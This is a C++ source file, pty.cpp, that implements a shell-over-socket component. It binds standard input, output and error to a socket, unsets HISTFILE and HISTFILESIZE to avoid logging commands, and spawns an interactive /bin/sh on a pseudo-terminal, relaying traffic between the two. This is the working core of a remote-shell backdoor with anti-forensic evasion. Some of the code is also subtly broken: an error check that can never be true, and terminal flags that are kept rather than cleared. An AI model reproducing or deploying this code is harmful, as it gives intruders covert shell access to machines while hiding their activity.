/*
 * File Name: pty.cpp
 * Author: Sphantix
 * Mail: sphantix@gmail.com
 * Created Time: Fri 08 Jan 2016 11:27:07 AM CST
 */

#include <pty.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <termios.h>
#include <stdlib.h>
#include <string>
#include "cpty.h" 

ssize_t CPty::Writen(int fd, const void *ptr, size_t n)
{
    size_t		nleft;
    ssize_t		nwritten;

    nleft = n;
    while (nleft > 0)
    {
        if ((nwritten = write(fd, ptr, nleft)) < 0)
        {
            if (nleft == n)
                return(-1); /* error, return -1 */
            else
                break;      /* error, return amount written so far */
        }
        else if (nwritten == 0)
            break;

        nleft -= nwritten;
        ptr   = (char *)ptr + nwritten;
    }
    return(n - nleft);      /* return >= 0 */
}

void CPty::SetRaw(int fd)
{
    struct termios term;
    int err;

    if (tcgetattr(fd, &term) == -1)
        return;

    term.c_iflag = term.c_iflag & (BRKINT | ICRNL | INPCK | ISTRIP | IXON);
    term.c_oflag = term.c_oflag & ~(OPOST);
    term.c_cflag = term.c_cflag & ~(CSIZE | PARENB);
    term.c_cflag = term.c_cflag | CS8;
    term.c_lflag = term.c_lflag & ~(ECHO | ICANON | IEXTEN | ISIG);
    term.c_cc[VMIN] = 1;
    term.c_cc[VTIME] = 0;

    err = tcsetattr(fd, TCSAFLUSH, &term);

    if (err == -1 && err == EINTR)
        return;
}

void CPty::Loop(int pty_fd)
{
    bool loop = true;
    char buf[1024];
    struct timeval tv;

    while(loop)
    {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(STDIN_FILENO, &rfds);
        FD_SET(pty_fd, &rfds);

        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int maxfd = pty_fd > STDIN_FILENO ? pty_fd + 1 : STDIN_FILENO + 1;
        int ret = select(maxfd, &rfds, NULL, NULL, &tv);

        if (ret == -1)
            break;
        else if(ret)
        {
            if(FD_ISSET(pty_fd, &rfds))
            {
                ssize_t len = read(pty_fd, buf, 1024);
                if (len == 0)
                    FD_CLR(pty_fd, &rfds);
                else
                    Writen(STDOUT_FILENO, buf, len);
            }

            if(FD_ISSET(STDIN_FILENO, &rfds))
            {
                ssize_t len = read(STDIN_FILENO, buf, 1024);
                if ((len == 0) || (len == -1))
                {
                    FD_CLR(STDIN_FILENO, &rfds);
                    loop = false;
                }
                else
                    Writen(pty_fd, buf, len);
            }
        }
    }
}

void CPty::Spawn(int sock)
{
    int mfd;
    int err;
    struct termios old_term;
    int restore = 0;
    std::string shell("/bin/sh");

    close(STDOUT_FILENO);
    dup2(sock, STDOUT_FILENO);

    close(STDIN_FILENO);
    dup2(sock, STDIN_FILENO);

    close(STDERR_FILENO);
    dup2(sock, STDERR_FILENO);

    unsetenv("HISTFILE");
    unsetenv("HISTFILESIZE");

    switch(forkpty(&mfd, NULL, NULL, NULL))
    {
        case -1:
            exit(-1);
            break;
        case 0:         /* child */
            execl(shell.c_str(), shell.c_str(), "-i", NULL);
            break;
        default:        /* parent */
            break;
    }

    if (tcgetattr(STDIN_FILENO, &old_term) != -1)
    {
        restore = 1;
        SetRaw(STDIN_FILENO);
    }

    Loop(mfd);

    if(restore)
    {
        err = tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
        if (err == -1 && err == EINTR)
            exit(-1);
    }

    close(mfd);
}
